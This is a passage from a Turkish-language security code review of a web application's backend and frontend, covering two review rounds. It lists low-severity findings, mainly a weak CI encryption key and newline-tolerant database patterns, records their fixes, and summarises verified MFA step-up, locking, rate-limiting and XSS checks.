tetiklenir, gerçek dağıtık kod denemesiyle ayırt edilemez. Güvenlik açığı değil, alarm kalitesi.
Düzeltme: yalnız `hit` kilidi başlattığında say (countFailedLookup) ya da implementation/runbook metnini "reddedilen istek"
olarak düzelt ve eşiği buna göre ayarla. (backend-dev / devops)

#### [DÜŞÜK] S14-7 CI'daki sıfır baytlık `APP_ENCRYPTION_KEYS` üretimde reddedilmiyor — A05

Yer: `.github/workflows/ci.yml` (`APP_ENCRYPTION_KEYS=v1:AAAA…=`), `apps/server/src/env.ts:85-120`
Sorun: değerin kendisi sır değil ve yalnız `docker compose config` için kullanılıyor (doğru). Ancak biri bu satırı kopyalarsa
üretim, herkesçe bilinen anahtarla açılır; env.ts sıfır/tekrarlı anahtarı reddetmiyor.
Düzeltme: `NODE_ENV=production`'da tüm baytları aynı olan anahtar → başlangıç hatası. (backend-dev)

#### [DÜŞÜK] S14-8 Sondaki satır sonlandırıcıyı kabul eden kalan desenler — A03

Yer: 4 e-posta CHECK'i (dba açık bulgusu) ve `system_settings_mysql_chk` JSON şemasındaki `host`/`database` `pattern`'ları (`…$`;
P11'den, `20261116010000_p14a_mysql_tls` aynen taşıdı).
Sorun: zod sınırda engelliyor; DB son savunma hattı olarak `\n` sonlu değeri kabul eder (`smtp_from_email` SMTP başlığına gider).
Düzeltme: P15 dba — aynı kalıpla `\z` / JSON şema desenini `[^\n]` ile sınırla. (dba)

### Odak noktaları — doğrulanan (sorun yok)

- **Step-up:** `consumeSecondFactor` giriş ve step-up'ta ortak; TOTP `totp_last_step` koşullu UPDATE (aynı/eski adım → replay,
  giriş kodu step-up'ta tekrar kullanılamaz); kurtarma kodu `used_at IS NULL` koşullu UPDATE ve `step_up_at` yazımı ile AYNI TX,
  oturum iptal edilmişse UNAUTHENTICATED → rollback (kod boşa harcanmaz). Sayaç `mfaPair`/`mfaUser` `/mfa/verify` ile ortak,
  deneme doğrulamadan önce sayılıyor. `step_up_at` oturum satırında; yeni oturum (verify/rotasyon) NULL başlıyor. Guard 5 dk,
  TOTP yok → 403. PUT/DELETE mysql|turn|whatsapp bağlı; `requireTls` true→false düşürmesi de step-up ister. Audit `{method,
remaining}`/`{method, reason}` — kod yok. E-posta: kod/IP/oturum içermez, yalnız kalan sayı; `who(auth).tenantId` Super Admin'in
  kendi (NULL) kapsamı → firma SMTP'sine sızmaz. Hatalı kod 400 sapması (A2 #1) kabul edilebilir.
- **If-Match / kilit:** `lockUsers` tekil+sıralı `IN … ORDER BY id FOR UPDATE` (PK sırasıyla kilit; deadlock testi 20/20);
  aktör TX içinde yeniden okunuyor (pasif/silinmiş/başka firma/uç yetkisi). `bumpVersion` koşullu; `If-Match` katı `"v<n>"`, 428
  gövdeden önce. mfaSetup yarışı version ile kapalı. A2 sapmaları #6–#8 güvenlik açısından uygun.
- **403 audit:** `{op, denied:[anahtar|role|status|mfa|actor]}`, e-posta çakışması `{op, reason}` — PII yok.
- **Hız sınırı anahtarları:** `/users*` ve `/admin/*` kullanıcı kimliği (requireAuth hook'u önce kayıtlı); POST ayrıca 10/dk;
  `/ws/panel` oturum token SHA-256'sı, yalnız kimlik doğrulandıktan sonra sayılıyor, IP kovası korunuyor; 4429 `retry=` doğru.
  `/ws/request` `wsUpgrade` sayımı güvenden sonra, kilitli anahtar baştan reddediliyor, `refInvalid` herkese aynı.
- **Tenant deactivate TX:** talep iptali + kayıt geçersizleştirme + satır audit'leri aynı TX; commit sonrası yalnız bildirim.
- **`/users/options`:** `tenantScope` + `scoped()` (SUPER_ADMIN satırları hariç), firma seçmemiş Super Admin 403, USER yalnız
  kendisi; alan `{id, fullName, status}` — e-posta yok. **`/admin/tenants/options`:** SUPER_ADMIN hook'u, `$queryRaw` parametreli,
  `\ % _` kaçışı doğru (MySQL LIKE varsayılan kaçış `\`), `q` ≤ 480 + görünmez karakter reddi, `limit` şemalı.
- **Migration'lar:** ön kontrol yordamı yalnız okur, NULL semantiği CHECK ile aynı, SIGNAL öncesi hiçbir DDL yok; tablo başına tek
  ALTER (kısıtsız an yok); down gevşetme yönünde, kalıntı yordamı siler. `requireTls` şeması `additionalProperties:false` korunarak eklendi.
- **CI:** stability.yml `contents: read`, secret yok, Action'lar SHA'lı, `inputs.runs` env üzerinden geçip betikte sayı denetimi
  (ifade enjeksiyonu yok); shellcheck/actionlint imajları digest'li, `persist-credentials: false`.
- **remote-watch yeni kontroller:** durum dosyası örnekleri ve yeni metrik alanları regex ile süzülüyor (S14-2 eski alan için).

### Otomatik tarama çıktıları

- gitleaks: makinede kurulu değil (çalıştırılamadı; CI gitleaks işi kapsıyor). Yerine diff + yeni dosyalarda desen taraması:
  yalnız test fikstürü şifreleri (`p14a-a3-settings.test.ts:41,67`, `"Sifre-p14a-*"`) — sır değil.
- `git log --all -- '*.env*'`: yalnız `.env.example` izleniyor.
- npm/pnpm audit bu turda koşulmadı: yeni bağımlılık yok (A0'daki `prettier` 3.10.1 yalnız dev).

### Tasarımda vaat edilip kodda bulunmayanlar

- Yok (kapsam içi). Sapmalar implementation.md A2 #1–#9 ve A3 `requireTls` migration'ı gerekçeli; S14-1, AC-209 tasarım
  sırasının (kapı → IP kovası) yan etkisi — mimara not: "hazır mı" kontrolü kova sayımından önce, kilitli-IP reddinden sonra olmalı.

### Olumlu

- İkinci faktör tüketimi tek fonksiyonda ve TX içinde; tekrar oynatma koruması giriş ile step-up arasında paylaşılıyor.
- MySQL testinde DNS rebinding kapalı (tek çözümleme, IP'ye bağlantı, adla sertifika doğrulama).
- Yetki kararları TX içindeki taze aktör okumasıyla; deadlock'a karşı sabit kilit sırası ve kancalı yarış testleri.
- Orta/Düşük maddelerin `docs/gereksinimler.md` §9'a "Sonra" olarak eklenmesi önerilir (S14-1 ve S14-2'nin P14a kapanmadan
  düzeltilmesi önerilir; küçük ve yerel değişiklikler).

## P14a/P14b — kod turu 2

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 1 (açık kalan: S14-8, dba P15)

Kapsam: (1) tur 1 düzeltmelerinin doğrulanması (implementation.md "P14 güvenlik düzeltmeleri — backend", "P14a A5 — S14-2
düzeltmesi"); (2) `git diff b2e5771 -- apps/web` (implementation.md "P14b B3 bölüm 1", "P14a A4 + P14b B3 bölüm 2"). Kod değiştirilmedi.

### Tur 1 bulgularının durumu

| Bulgu         | Durum   | Kanıt                                                                                                                                                                                                                                               |
| ------------- | ------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| S14-1 (Orta)  | KAPANDI | `requests/service.ts:311` kapıdan önce `assertCreateNotBlocked` (`blocked()`, sayımsız; ip/önek/net48), `hit` kapının içinde (`:313-317`); güvenilen CIDR muaf. Kilitli IP kapıya girmiyor; ret audit'i `rateAudit` kovasıyla sınırlı.              |
| S14-2 (Orta)  | KAPANDI | `deploy/ops/remote-watch.sh:248-252` `st_epoch`, `r_fail`, `r_last` `$(( ))` öncesi `^[0-9]+$`; geçersiz `r_last` → alarm. Kalan `$(( ))` girdileri (durum dosyası, sayaç örnekleri) zaten süzülüyor.                                               |
| S14-3         | KAPANDI | `settings/mysql-probe.ts:87` `localish = cls !== "public"`; tek etiket istisnası kaldırıldı.                                                                                                                                                        |
| S14-4         | KAPANDI | `requests/repo.ts:80` `shareTenantActive` (`tenants … FOR SHARE`), `service.ts:390` `lockSettings` sonrası; pasif → tek 404 yolu. Kilit sırası settings(X) → tenants(S); pasife alma tenants(X) → support_requests, settings istemiyor → döngü yok. |
| S14-5         | KAPANDI | `users/service.ts:340-350` `assertManage` → kendi hesabı → `assertGrantable` → sürüm karşılaştırması.                                                                                                                                               |
| S14-6         | KAPANDI | `sessions/public.ts` sayaç yalnız `countFailedLookup`'ta kilit başlarken (`:176-177`); `assertLookupAllowed` artık saymıyor.                                                                                                                        |
| S14-7         | KAPANDI | `env.ts:35,111` `isWeakEncryptionKey`; production'da listedeki herhangi bir zayıf sürüm başlangıçta reddediliyor, değer mesaja yazılmıyor.                                                                                                          |
| S14-8 (Düşük) | AÇIK    | dba P15 (4 e-posta CHECK'i + `system_settings_mysql_chk` host/database deseni). `docs/gereksinimler.md` §9 "Sonra".                                                                                                                                 |

### Frontend incelemesi — bulgu yok

- **Step-up / api istemcisi (`lib/api.ts`, `components/account/step-up-dialog.tsx`):** yalnız 401 + `MFA_STEP_UP_REQUIRED`
  yakalanıyor; istek bir kez tekrarlanıyor (ikinci 401 çağırana gidiyor, döngü yok); eşzamanlı istekler tek diyalog sözünü
  paylaşıyor; işleyici yoksa hata aynen fırlıyor. Diyaloğun kendi isteği `{ stepUp: false }`. Tekrar güvenli: `requireStepUp`
  route preHandler'ı olduğu için ilk istek hiçbir yan etki üretmeden reddediliyor. CSRF: tekrar `send()` içinden aynı başlık
  kurulumuyla gidiyor; `init.headers` önce yayılıyor, sabit başlıklar üzerine yazıyor (ek başlık CSRF'yi ezemez). Kod: form
  `noValidate` + `preventDefault` (URL'ye düşmüyor), konsol/log yazımı yok, alan her açılışta sıfırlanıyor; TOTP
  `autoComplete="one-time-code"`, kurtarma kodu `autoComplete="off"`. `isUnauthenticated` step-up kodunu oturum düşmesi
  saymıyor (girişe yanlış yönlendirme yok).
- **If-Match (`users/[id]/user-editor.tsx:114-116`):** `userEtag(saved.version)`; 409/428 → yeniden yükle; durum değiştiren
  eylemlerden sonra GET ile sürüm tazeleniyor (`:373-374`).
- **Combobox / tenant-switcher XSS:** `dangerouslySetInnerHTML`/`innerHTML` yok (diff genelinde de yok); firma adları React
  metin düğümü. Sorgu `URLSearchParams` ile kodlanıyor, `q` 120 karakterle kırpılıyor (sunucu 480).
- **Panel WS 4429 (`lib/requests/panel-socket.ts`):** yalnız `retry=<sn>` gerekçesinde yeniden deneme; bekleme sunucunun kalan kilit
  süresi × [0,8; 1,2] (sunucu en az 1 sn yazıyor); `too_many`/gerekçesiz 4429 ve 1008 → dur; diğer kopmalar üstel (≤ 30 sn),
  açılamayan 3 denemede dur. Sunucu kilitliyken `hit` yapmadığı için yeniden denemeler kilidi uzatmıyor → fırtına yok.
- **Logo/avatar ön kabul (AC-229):** `file.type === ""` ise yalnız `.png/.jpg/.jpeg/.webp` uzantısı ön kabul; bildirilen
  izinsiz MIME (ör. `image/svg+xml`) reddediliyor; boyut sınırı aynı. Sunucu yükleme kodu değişmedi (`apps/server/src/uploads`
  diff boş) → karar magic bytes'ta.
- **Chat hız sınırı (AC-227):** gönderen 5/sn (`chatSendLimiter`), alıcı 10/sn (`IN_LIMITS.chat`) — kötü niyetli eş gönderen
  sınırını atlasa da alıcı sınırı geçerli; HTML yorumlanmıyor.
- **Leave-guard:** yalnız aynı origin `a[href]` yakalanıyor (`a.origin !== location.origin` → dokunma); `pushState` aynı URL ile;
  açık yönlendirme yok.

### Otomatik tarama çıktıları

- Frontend diff'inde tehlikeli çıkış noktası taraması (`dangerouslySetInnerHTML|innerHTML|eval|new Function|console.|localStorage`):
  yalnız bir yorum satırı (chat-panel). Yeni bağımlılık yok. gitleaks bu makinede kurulu değil (CI işi kapsıyor).

### Olumlu

- Step-up istemci mantığı saf fonksiyonda ve birim testli (tek tekrar / vazgeç / eşzamanlı tek diyalog).
- Tur 1'deki iki Orta bulgu hedefli, testli ve yan etkisiz düzeltildi; S14-2 için enjeksiyon negatif testleri eklendi.
